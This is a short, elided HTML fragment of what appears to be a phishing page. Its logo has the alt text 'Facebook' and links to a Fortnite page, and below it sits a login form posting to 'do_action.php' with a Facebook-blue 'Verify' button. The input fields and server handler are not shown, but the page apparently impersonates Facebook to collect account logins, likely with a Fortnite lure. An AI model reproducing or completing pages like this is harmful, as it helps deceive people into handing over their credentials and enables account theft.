...
<body>
	...
	<header>
		<div class="main-header">
			<div class="logo">
				<a href="Fortnite.html"><img src="logo.png" alt="Facebook"></a>
			</div>
		</div>
	</header>
	<section>
		...
		<div class="form">
			...
			<div class="login-form">
				<form action="do_action.php">
					...
					<input type="submit" name="submit" value="Verify" onclick="myFunction()"  style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
